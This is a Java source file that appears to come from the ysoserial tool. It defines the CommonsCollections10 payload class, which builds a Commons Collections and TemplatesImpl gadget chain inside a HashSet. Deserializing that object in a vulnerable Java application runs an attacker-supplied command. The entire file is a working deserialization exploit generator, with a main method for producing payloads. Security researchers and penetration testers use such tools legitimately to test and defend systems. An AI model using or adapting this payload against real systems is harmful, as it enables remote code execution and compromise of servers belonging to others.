package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections10 extends PayloadRunner implements ObjectPayload<HashSet> {
    public HashSet getObject(String command) throws Exception{
        Object templates = Gadgets.createTemplatesImpl(command);
        InvokerTransformer transformer = new InvokerTransformer("toString",new Class[0], new Object[0]);
        Map<Object,Object> innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap,(Transformer) transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap,templates);
        HashSet<String> map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try{
            f = HashSet.class.getDeclaredField("map");
        }catch (NoSuchFieldException e){
            f = HashSet.class.getDeclaredField("backingMap");
        }
        Reflections.setAccessible(f);
        HashMap innimpl = null;
        innimpl = (HashMap)f.get(map);
        Field f2 = null;
        try{
            f2 = HashMap.class.getDeclaredField("table");
        }catch (NoSuchFieldException e){
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        Reflections.setAccessible(f2);
        Object[] array = new Object[0];
        array = (Object[])f2.get(innimpl);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch (Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        Reflections.setAccessible(keyField);
        keyField.set(node,entry);
        Reflections.setFieldValue(transformer,"iMethodName","newTransformer");
        return map;
    }

    public static void main(String[] args) throws Exception{
        PayloadRunner.run(CommonsCollections10.class,args);
    }
}
